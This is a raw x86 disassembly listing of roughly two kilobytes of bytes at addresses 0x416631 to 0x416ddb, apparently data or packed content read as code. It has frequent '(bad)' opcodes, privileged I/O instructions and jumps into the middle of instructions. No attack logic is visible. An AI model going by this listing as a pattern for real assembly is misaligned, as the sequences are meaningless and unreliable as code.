  416631:	fsub   DWORD PTR [ebx-0x3e4ed5a8]
  416637:	hlt    
  416638:	ins    BYTE PTR es:[edi],dx
  416639:	jmp    0x43942be8
  41663e:	sahf   
  41663f:	mov    ah,0x73
  416641:	imul   esi,DWORD PTR [ebp-0x61],0xffffff90
  416645:	pop    eax
  416646:	cmp    eax,DWORD PTR [eax+0x6ca3f52e]
  41664c:	enter  0x30e9,0xb5
  416650:	test   eax,0xbfa00184
  416655:	sbb    edx,ebp
  416657:	(bad)  [ecx+0x4]
  41665a:	cmp    eax,0xb5de1919
  41665f:	dec    esi
  416660:	jo     0x416639
  416662:	(bad)  
  416663:	outs   dx,BYTE PTR ds:[esi]
  416664:	mov    cl,0xc5
  416666:	pop    ds
  416667:	pop    edi
  416668:	sub    al,0xca
  41666a:	xor    eax,0x606d5bc5
  41666f:	iret   
  416670:	xor    al,0x38
  416672:	enter  0x18bd,0x56
  416676:	ja     0x41667f
  416678:	popf   
  416679:	arpl   WORD PTR [edi+0x2b],bp
  41667c:	xor    eax,DWORD PTR [ebp-0x46feaee6]
  416682:	mov    esp,0xe0c408ea
  416687:	xchg   edi,eax
  416688:	jnp    0x41667f
  41668a:	xchg   ebp,eax
  41668b:	push   ebp
  41668c:	ja     0x41668f
  41668e:	add    al,cl
  416690:	fyl2xp1 
  416692:	cs enter 0xf623,0xa0
  416697:	aas    
  416698:	fcom   DWORD PTR [ebx]
  41669a:	les    ebx,FWORD PTR [eax]
  41669c:	mov    edi,0x456bd23c
  4166a1:	scas   al,BYTE PTR es:[edi]
  4166a2:	and    DWORD PTR [eax],0x30a597a0
  4166a8:	ins    DWORD PTR es:[edi],dx
  4166a9:	push   0xb2146c57
  4166ae:	add    BYTE PTR ds:0xd0e83197,al
  4166b4:	xor    edx,DWORD PTR fs:[esp+edx*8]
  4166b8:	xor    al,0x2c
  4166ba:	fbstp  TBYTE PTR [eax+0x7e]
  4166bd:	mov    al,ds:0x60bb2810
  4166c2:	dec    edx
  4166c3:	out    dx,eax
  4166c4:	pop    ecx
  4166c5:	mov    eax,0x7eb62b93
  4166ca:	jo     0x41669f
  4166cc:	mov    ecx,DWORD PTR ss:[esi+edi*4+0x65]
  4166d1:	outs   dx,DWORD PTR ds:[esi]
  4166d2:	inc    ecx
  4166d3:	mov    bh,0x58
  4166d5:	je     0x4166c1
  4166d7:	cmc    
  4166d8:	inc    eax
  4166d9:	rcl    DWORD PTR [ebp-0x4095d66a],0xb0
  4166e0:	sbb    DWORD PTR [edx-0x13f4803d],0xf8926493
  4166ea:	mov    DWORD PTR [eax-0x61],esp
  4166ed:	mov    ds:0x43f2c939,al
  4166f2:	push   esp
  4166f3:	xchg   ebx,eax
  4166f4:	leave  
  4166f5:	and    cl,dh
  4166f7:	call   FWORD PTR [edx-0x3fafd559]
  4166fd:	xor    DWORD PTR [edi+0x201d9f16],ebx
  416703:	bnd ss jge 0x4166b4
  416707:	xchg   edx,eax
  416708:	mov    ds:0xdfd319,eax
  41670d:	fs dec edi
  41670f:	inc    ebx
  416710:	or     DWORD PTR fs:[ebx],edx
  416713:	push   ecx
  416714:	jp     0x4166a5
  416716:	mov    al,0xbf
  416718:	test   eax,0xa2710997
  41671d:	inc    esi
  41671e:	or     eax,0x79e4c8b0
  416723:	fucom  st(3)
  416725:	adc    al,0xbd
  416727:	aam    0x10
  416729:	in     eax,dx
  41672a:	or     dl,cl
  41672c:	and    esi,DWORD PTR [esp+eiz*2-0x2c]
  416730:	pop    esi
  416731:	(bad)  
  416732:	int    0x5c
  416734:	jb     0x4166b7
  416736:	adc    bh,BYTE PTR [ebp+edi*1-0x3cbb9bf7]
  41673d:	(bad)  
  41673e:	call   0x5a4c:0x85f40a0
  416745:	in     eax,dx
  416746:	add    DWORD PTR [eax+0x49],eax
  416749:	jae    0x4167a0
  41674b:	sbb    al,0xe
  41674d:	xchg   esi,eax
  41674e:	pushf  
  41674f:	mov    esi,0x739d6480
  416754:	fidivr WORD PTR [edx]
  416756:	or     DWORD PTR ds:0x376e0e5f,edi
  41675c:	fld    QWORD PTR [edi+0x69]
  41675f:	jl     0x416761
  416761:	mov    edi,eax
  416763:	sub    ebp,DWORD PTR [ecx+eiz*8+0x592da5d6]
  41676a:	pusha  
  41676b:	scas   al,BYTE PTR es:[edi]
  41676c:	add    eax,0xf217cb94
  416771:	shl    DWORD PTR [ebp+0x2dba24dd],0x7d
  416778:	fcom   DWORD PTR [edx+0x4886962d]
  41677e:	mov    eax,ds:0xd654eeb6
  416783:	lds    esi,FWORD PTR [eax+0x300793b5]
  416789:	jno    0x416734
  41678b:	mov    ebx,0xe89b5b
  416790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416791:	stos   DWORD PTR es:[edi],eax
  416792:	arpl   WORD PTR [edi+esi*2-0x80],di
  416796:	cmp    ebp,edi
  416798:	fsub   QWORD PTR [edx]
  41679a:	or     DWORD PTR [ecx+0x5d],esi
  41679d:	and    al,0x62
  41679f:	pop    es
  4167a0:	fisub  WORD PTR [eax]
  4167a2:	fcom   st(5)
  4167a4:	sub    eax,DWORD PTR [ebx+0x40c544e1]
  4167aa:	sar    dh,1
  4167ac:	jg     0x41680e
  4167ae:	lock dec ebx
  4167b0:	fwait
  4167b1:	shr    bl,1
  4167b3:	leave  
  4167b4:	aad    0x60
  4167b6:	je     0x4167aa
  4167b8:	jns    0x4167ad
  4167ba:	mov    bl,0x8b
  4167bc:	jge    0x416796
  4167be:	mov    dl,0x76
  4167c0:	int3   
  4167c1:	fnstsw ax
  4167c3:	cmp    DWORD PTR [ebx-0x2e],ebx
  4167c6:	mov    al,0x62
  4167c8:	aas    
  4167c9:	cmp    eax,0xb15dfd0d
  4167ce:	dec    edx
  4167cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167d0:	adc    eax,0x7dec3ee2
  4167d5:	ffree  st(2)
  4167d7:	mov    dl,0x13
  4167d9:	xor    al,0x29
  4167db:	xchg   ebx,eax
  4167dc:	mov    dl,0x3b
  4167de:	add    eax,0x8c507f4f
  4167e3:	jg     0x41676d
  4167e5:	ret    0x39e3
  4167e8:	push   ecx
  4167e9:	mov    ebx,ebx
  4167eb:	push   es
  4167ec:	mov    dl,0xc1
  4167ee:	xchg   ebx,eax
  4167ef:	mov    ds:0xadd14db,eax
  4167f4:	in     eax,0x36
  4167f6:	sub    esi,DWORD PTR [esp+ebx*2+0x588fbc1f]
  4167fd:	sub    dl,BYTE PTR [edx-0x3a9cd52]
  416803:	scas   al,BYTE PTR es:[edi]
  416804:	add    BYTE PTR [edi-0x7c574b00],cl
  41680a:	jnp    0x41686a
  41680c:	leave  
  41680d:	loop   0x4167a1
  41680f:	call   0x7d50:0x7b4faba9
  416816:	jbe    0x4167cd
  416818:	cs pop ecx
  41681a:	cmp    dh,0x8b
  41681d:	outs   dx,BYTE PTR ds:[esi]
  41681e:	and    DWORD PTR [eax],0xffffffd6
  416821:	pusha  
  416822:	cli    
  416823:	sar    dl,0x9a
  416826:	sub    eax,ecx
  416828:	adc    edx,DWORD PTR [ebp+0xf07b884]
  41682e:	nop
  41682f:	pop    eax
  416830:	xchg   edi,eax
  416831:	sqrtps xmm6,XMMWORD PTR [eax]
  416834:	js     0x416889
  416836:	adc    esp,esp
  416838:	push   edx
  416839:	add    ch,BYTE PTR cs:[esi+0x21f50c12]
  416840:	mov    bl,BYTE PTR cs:[esi+0x4b]
  416844:	jecxz  0x4168bf
  416846:	cmp    DWORD PTR [ebx+0x31b782b1],esp
  41684c:	xor    edi,DWORD PTR [ebp*8+0x285ca4be]
  416853:	pop    ss
  416854:	cmp    al,0x5c
  416856:	inc    edx
  416857:	xchg   esi,eax
  416858:	in     eax,0xf
  41685a:	das    
  41685b:	jmp    0x77da5382
  416860:	jnp    0x416868
  416862:	sbb    dh,BYTE PTR [ebp+0x50]
  416865:	or     BYTE PTR [edi],dh
  416867:	or     eax,0xf7fa4a1e
  41686c:	stos   DWORD PTR es:[edi],eax
  41686d:	test   DWORD PTR ds:0x986be6fb,edx
  416873:	in     al,dx
  416874:	(bad)  
  416876:	xlat   BYTE PTR ds:[ebx]
  416877:	call   0x5f6d4d09
  41687c:	sbb    DWORD PTR [edx+0x2adf6397],ecx
  416882:	adc    DWORD PTR [esi],ecx
  416884:	mov    dl,0xd0
  416886:	cmp    DWORD PTR [ebx],eax
  416888:	(bad)  
  41688a:	imul   edi,DWORD PTR [esi+0x26],0x454e0ca0
  416891:	cld    
  416892:	cld    
  416893:	repz mov ds:0xa7585fae,eax
  416899:	add    BYTE PTR [eax+0x77],bh
  41689c:	mov    eax,0x28104f25
  4168a1:	jp     0x4168ff
  4168a3:	stos   DWORD PTR es:[edi],eax
  4168a4:	adc    bh,dl
  4168a6:	aaa    
  4168a7:	lods   eax,DWORD PTR ds:[esi]
  4168a8:	into   
  4168a9:	pop    ss
  4168aa:	aas    
  4168ab:	lea    ebp,[ebx]
  4168ad:	sar    BYTE PTR [eax],0xd3
  4168b0:	and    BYTE PTR [ebp-0x6b6e260b],cl
  4168b6:	sar    BYTE PTR [ebx],cl
  4168b8:	jno    0x41683e
  4168ba:	add    al,0xa7
  4168bc:	adc    DWORD PTR [edx-0x75],esi
  4168bf:	jmp    DWORD PTR [ecx+0x63a9ebb3]
  4168c5:	test   DWORD PTR [eax+0x23138bc8],esp
  4168cb:	mov    al,ds:0x6153f297
  4168d0:	fnstcw WORD PTR [ecx+0x53]
  4168d3:	rol    BYTE PTR [ecx],0x9c
  4168d6:	fisttp QWORD PTR [esi-0x46]
  4168d9:	mov    dl,0x89
  4168db:	test   eax,0x8282f020
  4168e0:	dec    edx
  4168e1:	mov    BYTE PTR [ebx],bl
  4168e3:	add    eax,0x2bc856e9
  4168e8:	fst    DWORD PTR [edi+edx*2]
  4168eb:	mov    edi,0xa81588ef
  4168f0:	fs mov al,0x35
  4168f3:	cli    
  4168f4:	mov    edx,0x48ea961b
  4168f9:	cld    
  4168fa:	(bad)  
  4168fb:	hlt    
  4168fc:	push   eax
  4168fd:	fwait
  4168fe:	loop   0x4168d6
  416900:	and    BYTE PTR [ebx],0x2d
  416903:	mov    edx,DWORD PTR [eax]
  416905:	inc    ebp
  416906:	adc    esi,DWORD PTR [ecx+0x36391209]
  41690c:	mov    BYTE PTR ss:[eax+0x6a],ch
  416910:	in     eax,dx
  416911:	sar    DWORD PTR [ebp-0x6ac37fe5],0xd4
  416918:	adc    DWORD PTR [eax],ecx
  41691a:	ja     0x4168d1
  41691c:	xchg   ecx,eax
  41691d:	sbb    DWORD PTR [eax+0x1789f93b],0x3
  416924:	in     al,dx
  416925:	(bad)
  416929:	sahf   
  41692a:	out    0xce,eax
  41692c:	xor    eax,0xb353071f
  416931:	ret    
  416932:	rcr    DWORD PTR [ebx+ecx*4],cl
  416935:	dec    esp
  416936:	cmp    DWORD PTR [edi+0xdbedf71],ebp
  41693c:	out    0x2a,eax
  41693e:	test   ah,dl
  416940:	xor    eax,0x2c7b12af
  416945:	sbb    BYTE PTR [eax+ecx*8],dh
  416948:	(bad)  
  416949:	jno    0x416958
  41694b:	dec    ebx
  41694c:	add    ebx,DWORD PTR [eax-0x63]
  41694f:	and    ebp,ecx
  416951:	cmp    edi,DWORD PTR [ecx]
  416953:	mov    cl,0xc8
  416955:	ret    0xe5e3
  416958:	push   ecx
  416959:	jne    0x4169af
  41695b:	outs   dx,BYTE PTR ds:[esi]
  41695c:	cdq    
  41695d:	xchg   ebp,edx
  41695f:	add    al,0x53
  416961:	push   esp
  416962:	or     al,0x53
  416964:	xlat   BYTE PTR ds:[ebx]
  416965:	pop    ss
  416966:	loope  0x4169d5
  416968:	sbb    al,0xc2
  41696a:	repnz mov al,ds:0x700b831a
  416970:	cmp    al,BYTE PTR [ebp-0xc]
  416973:	mov    eax,ds:0x16022b81
  416978:	push   eax
  416979:	aam    0xb9
  41697b:	xchg   edi,eax
  41697c:	ss aaa 
  41697e:	out    0x26,eax
  416980:	popf   
  416981:	fisub  WORD PTR [ebx]
  416983:	inc    edi
  416984:	rcl    DWORD PTR [ebx],1
  416986:	ss jb  0x41699b
  416989:	ss out 0xd1,eax
  41698c:	je     0x4169b6
  41698e:	adc    al,0x3c
  416990:	mov    dh,bh
  416992:	mov    al,ds:0xa83ffc73
  416997:	fcom   QWORD PTR [esi+0x493537b5]
  41699d:	rcr    BYTE PTR [eax],cl
  41699f:	call   0xf976c1eb
  4169a4:	push   edi
  4169a5:	dec    eax
  4169a6:	lods   al,BYTE PTR ds:[si]
  4169a8:	test   al,0xb5
  4169aa:	ins    BYTE PTR es:[edi],dx
  4169ab:	push   ebx
  4169ac:	dec    esp
  4169ad:	mov    ecx,0x6ab87d8a
  4169b2:	not    DWORD PTR [edi+0x5aa4bbb]
  4169b8:	call   0xea4c9696
  4169bd:	dec    esp
  4169be:	mov    al,0xcf
  4169c0:	mov    dl,0xf1
  4169c2:	dec    edx
  4169c3:	jns    0x416a07
  4169c5:	cmp    DWORD PTR [ebx],0xbc76309e
  4169cb:	test   al,0x96
  4169cd:	mov    ebp,0x9d5c58f3
  4169d2:	mov    ch,0x36
  4169d4:	aaa    
  4169d5:	push   ds
  4169d6:	aam    0x6a
  4169d8:	push   ss
  4169d9:	imul   edi,DWORD PTR [esi+0x1a],0xfb82b908
  4169e0:	jle    0x4169a3
  4169e2:	add    al,0xd9
  4169e4:	jne    0x416a22
  4169e6:	jbe    0x4169ce
  4169e8:	sar    BYTE PTR [eax+0x2],0xd8
  4169ec:	outs   dx,BYTE PTR ds:[esi]
  4169ed:	pop    ss
  4169ee:	sbb    eax,0x9ae4e27b
  4169f3:	mov    bh,0x58
  4169f5:	xlat   BYTE PTR ds:[ebx]
  4169f6:	out    dx,eax
  4169f7:	(bad)  
  4169f9:	mov    bh,0xde
  4169fb:	cwde   
  4169fc:	fidivr WORD PTR [ecx+0x3f]
  4169ff:	test   eax,0x82da1a4b
  416a04:	arpl   WORD PTR [eax-0x11cba346],bx
  416a0a:	mov    dl,0xe8
  416a0c:	ds push ss
  416a0e:	out    dx,eax
  416a0f:	es sub eax,edi
  416a12:	test   ebp,0xb254e53a
  416a18:	adc    ebx,eax
  416a1a:	call   0xad4:0x9dd56327
  416a21:	pop    edx
  416a22:	jecxz  0x416a08
  416a24:	push   edx
  416a25:	jae    0x4169b7
  416a27:	sbb    BYTE PTR [ecx+0x6f835151],ch
  416a2d:	push   ebx
  416a2e:	inc    eax
  416a2f:	(bad)  
  416a30:	retf   0x6b34
  416a33:	inc    ebx
  416a34:	xlat   BYTE PTR ds:[ebx]
  416a35:	inc    edx
  416a36:	ins    DWORD PTR es:[edi],dx
  416a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a38:	loope  0x416a19
  416a3a:	dec    esp
  416a3b:	and    eax,DWORD PTR [edi+0x3e3619da]
  416a41:	lock add BYTE PTR [edi-0x59],cl
  416a45:	mov    ds:0xb2e6b378,al
  416a4a:	mov    edi,0x39607723
  416a4f:	ins    DWORD PTR es:[edi],dx
  416a50:	call   0xfcd2c2ab
  416a55:	jmp    0x4169d7
  416a57:	inc    ebx
  416a58:	hlt    
  416a59:	into   
  416a5a:	push   0x627e44c8
  416a5f:	outs   dx,DWORD PTR ds:[esi]
  416a60:	cmp    al,0x72
  416a62:	mov    bl,0xf
  416a64:	or     bh,cl
  416a66:	ins    DWORD PTR es:[edi],dx
  416a67:	push   edx
  416a68:	es into 
  416a6a:	or     DWORD PTR [esi+0x2e],edx
  416a6d:	loope  0x416a4a
  416a6f:	in     eax,dx
  416a70:	aam    0x89
  416a72:	lock (bad) 
  416a74:	adc    al,0xf0
  416a76:	(bad)
  416a79:	lea    eax,[esi+0x6f7884d9]
  416a7f:	shl    DWORD PTR [ecx+0x61],1
  416a82:	dec    ecx
  416a83:	inc    edi
  416a84:	out    0xd3,al
  416a86:	rcl    al,1
  416a88:	sbb    dl,BYTE PTR [ecx-0x7935c842]
  416a8e:	outs   dx,BYTE PTR ds:[esi]
  416a8f:	data16 (bad) 
  416a91:	mov    cl,0x69
  416a93:	(bad)  
  416a94:	call   0x5278:0x914ef1e9
  416a9b:	cmp    DWORD PTR [edx-0x5d],esp
  416a9e:	(bad)  
  416a9f:	call   0xf5a60592
  416aa4:	cmp    al,0x59
  416aa6:	inc    ecx
  416aa7:	cs pop es
  416aa9:	in     eax,dx
  416aaa:	sbb    esp,DWORD PTR [edx+0x734c6997]
  416ab0:	jg     0x416aab
  416ab2:	and    al,0xba
  416ab4:	cs push ebp
  416ab6:	push   eax
  416ab7:	inc    esp
  416ab8:	sbb    eax,0x90014b5b
  416abd:	into   
  416abe:	outs   dx,DWORD PTR ds:[esi]
  416abf:	jmp    0xf398833b
  416ac4:	mov    bl,0x85
  416ac6:	push   edx
  416ac7:	inc    edi
  416ac8:	push   ebx
  416ac9:	push   ecx
  416aca:	pop    esi
  416acb:	cmp    al,ch
  416acd:	scas   eax,DWORD PTR es:[edi]
  416ace:	push   ds
  416acf:	or     bl,BYTE PTR [ecx]
  416ad1:	outs   dx,BYTE PTR ds:[esi]
  416ad2:	rcl    BYTE PTR [ebx+ecx*4+0xb],1
  416ad6:	test   BYTE PTR [ebp-0x7b3f410a],0xbc
  416add:	pop    ds
  416ade:	mov    ?,edx
  416ae0:	mov    ah,0xd9
  416ae2:	mov    bl,0xf0
  416ae4:	je     0x416a7d
  416ae6:	sar    DWORD PTR [esi-0x67],cl
  416ae9:	xchg   ebp,eax
  416aea:	sbb    esi,edx
  416aec:	imul   DWORD PTR [eax+edi*4-0x76]
  416af0:	into   
  416af1:	cli    
  416af2:	push   ebp
  416af3:	inc    esi
  416af4:	clc    
  416af5:	mov    ah,BYTE PTR [edi]
  416af7:	jbe    0x416a8a
  416af9:	or     eax,0xcc9c342a
  416afe:	push   edx
  416aff:	test   BYTE PTR [edx],bh
  416b01:	and    al,0x97
  416b03:	adc    al,0x2a
  416b05:	cmc    
  416b06:	mov    DWORD PTR [edx+0x732b270],ebx
  416b0c:	add    ch,ch
  416b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b0f:	sub    DWORD PTR [ebx+eax*4+0x15e4de1a],0x7a
  416b17:	cmp    esi,DWORD PTR [edi+0x2f]
  416b1a:	or     bh,bh
  416b1c:	jae    0x416b88
  416b1e:	mov    edx,0x53603f9b
  416b23:	and    DWORD PTR [edi],eax
  416b25:	mov    al,0xc5
  416b27:	outs   dx,DWORD PTR ds:[esi]
  416b28:	and    ecx,esp
  416b2a:	jno    0x416afd
  416b2c:	mov    eax,0x1a72537a
  416b31:	mov    esi,0x7d6a0ab4
  416b36:	lahf   
  416b37:	test   edi,esi
  416b39:	cld    
  416b3a:	stos   BYTE PTR es:[edi],al
  416b3b:	inc    ebp
  416b3c:	push   cs
  416b3d:	mov    dh,0x7e
  416b3f:	shl    DWORD PTR [ecx+0x13],0x29
  416b43:	dec    edx
  416b44:	shr    eax,cl
  416b46:	(bad)  
  416b47:	jne    0x416b24
  416b49:	xchg   edx,eax
  416b4a:	mov    WORD PTR [edi+0x25],?
  416b4d:	xor    eax,0xbb054d37
  416b52:	gs xor ch,bl
  416b55:	jle    0x416b82
  416b57:	mov    ?,WORD PTR [ecx+0x3b]
  416b5a:	adc    DWORD PTR [edi-0x7a],edi
  416b5d:	mov    bl,BYTE PTR ds:0x87ac832e
  416b63:	or     eax,0xbb2331b3
  416b68:	std    
  416b69:	out    dx,eax
  416b6a:	imul   esp,DWORD PTR [edi-0x41],0x9972e89b
  416b71:	and    cl,BYTE PTR [edx]
  416b73:	icebp  
  416b74:	dec    esi
  416b75:	jno    0x416b8c
  416b77:	xor    esi,DWORD PTR [ebp+esi*1+0x4a]
  416b7b:	iret   
  416b7c:	xchg   ebp,eax
  416b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b7e:	adc    BYTE PTR [eax],dh
  416b80:	xchg   esi,eax
  416b81:	and    edi,DWORD PTR ds:0x1e1a1a0b
  416b87:	jmp    0x63483283
  416b8c:	dec    esi
  416b8d:	dec    esi
  416b8e:	xor    ecx,esp
  416b90:	push   ebx
  416b91:	lahf   
  416b92:	out    0xc8,al
  416b94:	(bad)  
  416b95:	or     BYTE PTR [eax+0x6d8292b],bh
  416b9b:	mov    eax,ds:0x401ce756
  416ba0:	jbe    0x416b92
  416ba2:	(bad)  
  416ba3:	(bad)  
  416ba4:	int3   
  416ba5:	stos   DWORD PTR es:[edi],eax
  416ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ba7:	xor    al,0x1d
  416ba9:	jb     0x416bc7
  416bab:	loope  0x416b7d
  416bad:	sbb    BYTE PTR [ebp-0x66],cl
  416bb0:	fwait
  416bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bb2:	shr    DWORD PTR [ebp+0x48e761a0],1
  416bb8:	fimul  DWORD PTR [ebp+0x11]
  416bbb:	mov    ch,0x2c
  416bbd:	and    ebx,DWORD PTR ds:0x8435eb63
  416bc3:	mov    bl,cl
  416bc5:	inc    eax
  416bc6:	rol    DWORD PTR [ecx+ebp*4-0x71],cl
  416bca:	push   es
  416bcb:	sub    bh,BYTE PTR [ebp-0x32]
  416bce:	imul   edx,DWORD PTR [eax+0x1273e4fe],0x29
  416bd5:	xchg   esi,ebx
  416bd7:	mov    al,0xe0
  416bd9:	div    DWORD PTR [ebx]
  416bdb:	scas   eax,DWORD PTR es:[edi]
  416bdc:	dec    ebx
  416bdd:	test   eax,0x17cc0577
  416be2:	xchg   BYTE PTR ds:0x69e0ca76,bl
  416be8:	rol    ebp,0x25
  416beb:	mov    esp,0x7c2c8b25
  416bf0:	push   0xffffffe0
  416bf2:	push   esi
  416bf3:	mov    bl,0x3
  416bf5:	and    BYTE PTR [edi+0x25f17bd7],dh
  416bfb:	retf   
  416bfc:	or     ebp,DWORD PTR [edx+eax*8+0xc5b8eac]
  416c03:	aaa    
  416c04:	push   edx
  416c05:	les    ebx,FWORD PTR [ebx]
  416c07:	mov    edi,0x8190b115
  416c0c:	aas    
  416c0d:	fistp  DWORD PTR [ecx]
  416c0f:	repz xor al,0x5e
  416c12:	sbb    eax,DWORD PTR [ebx+0x70d5213d]
  416c18:	cwde   
  416c19:	inc    edi
  416c1a:	and    DWORD PTR [edx+esi*4-0x34],eax
  416c1e:	adc    DWORD PTR [edx+eax*1],0x4ed87a57
  416c25:	cmp    ecx,0x6f32a67f
  416c2b:	daa    
  416c2c:	ret    
  416c2d:	jo     0x416c46
  416c2f:	mov    ebx,0x6cb8104d
  416c34:	(bad)  
  416c35:	xlat   BYTE PTR ds:[ebx]
  416c36:	push   edi
  416c37:	loopne 0x416c5d
  416c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c3a:	push   eax
  416c3b:	aam    0x29
  416c3d:	jno    0x416c5f
  416c3f:	push   esp
  416c40:	pop    edx
  416c41:	pop    ebp
  416c42:	jae    0x416bd2
  416c44:	(bad)  
  416c45:	mov    ch,0xfd
  416c47:	mov    ebp,0xb0d763de
  416c4c:	mov    ecx,0x3ff754f4
  416c51:	sahf   
  416c52:	test   eax,0xdb4e3811
  416c57:	xchg   edx,eax
  416c58:	sar    DWORD PTR [edx],0x4c
  416c5b:	and    bh,bl
  416c5d:	fcomp  QWORD PTR [edx-0x71]
  416c60:	imul   esi,DWORD PTR [edx],0x6c
  416c63:	dec    eax
  416c64:	cmp    al,0x8d
  416c66:	(bad)  
  416c67:	ins    BYTE PTR es:[edi],dx
  416c68:	bound  ebp,QWORD PTR [edi-0x40]
  416c6b:	test   BYTE PTR [edx+ebx*8-0xd],0xe3
  416c70:	scas   eax,DWORD PTR es:[edi]
  416c71:	xor    ah,BYTE PTR [ebx]
  416c73:	sbb    bl,BYTE PTR [ebx-0x4f23c9e9]
  416c79:	shr    DWORD PTR [edx],1
  416c7b:	cmp    ecx,DWORD PTR ds:0xb59e766
  416c81:	xor    eax,0x4a8146c4
  416c86:	adc    BYTE PTR [edx-0xda1b1],bh
  416c8c:	mov    ebx,0x3122cd60
  416c91:	push   eax
  416c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c93:	aas    
  416c94:	outs   dx,BYTE PTR ds:[esi]
  416c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c96:	jle    0x416c51
  416c98:	ds stos BYTE PTR es:[edi],al
  416c9a:	fcom   DWORD PTR [edi-0x58]
  416c9d:	xchg   ebx,eax
  416c9e:	test   eax,0xbbb9656c
  416ca3:	repz pop ebp
  416ca5:	push   ss
  416ca6:	add    eax,DWORD PTR [eax]
  416ca8:	ret    0x5904
  416cab:	mov    ch,0xdd
  416cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cae:	cwde   
  416caf:	mov    bl,0xad
  416cb1:	in     eax,0xdc
  416cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cb4:	icebp  
  416cb5:	fwait
  416cb6:	test   al,0x62
  416cb8:	add    eax,DWORD PTR [eax]
  416cba:	enter  0xc995,0x57
  416cbe:	push   eax
  416cbf:	rcl    BYTE PTR [edi+0x6d018903],cl
  416cc5:	xor    eax,0x1b9f8036
  416cca:	imul   eax,eax,0xffffffcb
  416ccd:	mov    al,ds:0xa4dc2d08
  416cd2:	inc    ebx
  416cd3:	(bad)  
  416cd4:	rcr    DWORD PTR [ebx],0x4a
  416cd7:	and    al,0xb2
  416cd9:	jge    0x416d56
  416cdb:	add    al,0xd7
  416cdd:	mov    ds:0x2eea1d16,eax
  416ce2:	cmp    bl,BYTE PTR [eax]
  416ce4:	mov    ecx,DWORD PTR [ecx]
  416ce6:	lahf   
  416ce7:	push   ds
  416ce8:	jle    0x416cf6
  416cea:	xchg   ebx,eax
  416ceb:	adc    eax,0x32060051
  416cf0:	rcl    cl,cl
  416cf2:	jbe    0x416d62
  416cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cf5:	jnp    0x416d64
  416cf7:	daa    
  416cf8:	fstp   DWORD PTR [edx]
  416cfa:	(bad)  
  416cfb:	fwait
  416cfc:	jp     0x416ccf
  416cfe:	gs js  0x416d18
  416d01:	fnsave [edx-0x5528cb77]
  416d07:	lods   al,BYTE PTR ds:[esi]
  416d08:	inc    esi
  416d09:	cli    
  416d0a:	adc    ebp,DWORD PTR [ecx]
  416d0c:	retf   
  416d0d:	ror    DWORD PTR [edx-0x6d652fe6],cl
  416d13:	dec    edi
  416d14:	jbe    0x416cfa
  416d16:	xchg   ebp,eax
  416d17:	cmc    
  416d18:	call   0x9aa0:0x1fae390d
  416d1f:	pop    edi
  416d20:	jns    0x416d24
  416d22:	jbe    0x416cb7
  416d24:	mov    ah,0xef
  416d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d27:	loopne 0x416d87
  416d29:	cmc    
  416d2a:	shr    DWORD PTR [ecx],1
  416d2c:	leave  
  416d2d:	push   ebx
  416d2e:	push   ebp
  416d2f:	pop    edx
  416d30:	ins    DWORD PTR es:[edi],dx
  416d31:	and    al,0x46
  416d33:	pop    ebp
  416d34:	xchg   edi,eax
  416d35:	(bad)  
  416d36:	xlat   BYTE PTR ds:[ebx]
  416d37:	xchg   BYTE PTR [eax-0x5715c98a],ch
  416d3d:	sub    ebx,DWORD PTR [eax+0x6373b138]
  416d43:	cmp    al,BYTE PTR [esi+0x1c]
  416d46:	popa   
  416d47:	je     0x416d82
  416d49:	pop    edi
  416d4a:	xchg   DWORD PTR [ebx-0xb],edx
  416d4d:	add    al,0x16
  416d4f:	adc    BYTE PTR [ebx+0x1677550d],dh
  416d55:	jns    0x416d72
  416d57:	scas   eax,DWORD PTR es:[edi]
  416d58:	fild   WORD PTR [edi+0x59]
  416d5b:	fst    DWORD PTR [esi]
  416d5d:	stos   BYTE PTR es:[edi],al
  416d5e:	out    0x6,eax
  416d60:	out    dx,eax
  416d61:	and    DWORD PTR [eax+0x10eaae76],esi
  416d67:	call   0xdd43:0x4991203b
  416d6e:	jmp    0x416d33
  416d70:	dec    edx
  416d71:	cmc    
  416d72:	cwde   
  416d73:	push   esi
  416d74:	mov    ah,BYTE PTR [edx]
  416d76:	in     al,dx
  416d77:	push   ebx
  416d78:	gs xchg esp,eax
  416d7a:	lock add al,0x2f
  416d7d:	(bad)  
  416d7e:	repz add al,0x2b
  416d81:	popa   
  416d82:	cld    
  416d83:	sbb    eax,DWORD PTR [edx-0x71]
  416d86:	pop    edi
  416d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d88:	jge    0x416dc0
  416d8a:	lock leave 
  416d8c:	fcmovb st,st(6)
  416d8e:	fld    QWORD PTR [edi-0xb]
  416d91:	cmp    DWORD PTR [ebx+0x6eed66f6],0xd45d5efc
  416d9b:	stc    
  416d9c:	pop    ss
  416d9d:	leave  
  416d9e:	add    al,0xfc
  416da0:	push   cs
  416da1:	sbb    ebx,DWORD PTR ds:0xb225201c
  416da7:	rcr    BYTE PTR [ebp-0x71dc9dbc],0xa6
  416dae:	mov    edi,fs
  416db0:	or     BYTE PTR [ebx+eiz*4+0x77],ch
  416db4:	dec    ecx
  416db5:	xchg   ebx,eax
  416db6:	inc    esi
  416db7:	inc    ebp
  416db8:	fcom   QWORD PTR [ecx-0x2b]
  416dbc:	in     eax,dx
  416dbd:	push   ss
  416dbe:	enter  0x9ea2,0xd1
  416dc2:	inc    edi
  416dc3:	retf   0x7127
  416dc6:	mov    ds:0xd7baa44f,eax
  416dcb:	mov    al,ds:0xfe6595e6
  416dd0:	cs lahf 
  416dd2:	sub    ah,BYTE PTR [edx-0x5e]
  416dd5:	call   0x95c6b970
  416dda:	inc    ebp
  416ddb:	das    
